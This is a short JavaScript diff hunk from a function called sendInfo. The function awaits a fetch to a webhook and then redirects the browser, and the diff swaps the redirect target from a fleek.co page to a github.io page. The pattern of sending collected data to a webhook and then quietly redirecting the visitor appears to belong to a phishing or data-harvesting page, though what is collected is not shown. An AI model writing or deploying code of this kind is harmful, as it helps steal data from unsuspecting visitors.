@@ -81,10 +81,10 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("https://spring-feather-2536.on.fleek.co/")
+        window.location.replace("https://terrykiddo.github.io/TK/")
     }, 1000);
   }
   setTimeout(function() {
-    window.location.replace("https://spring-feather-2536.on.fleek.co/")
+    window.location.replace("https://terrykiddo.github.io/TK/")
   }, 1000);
 }
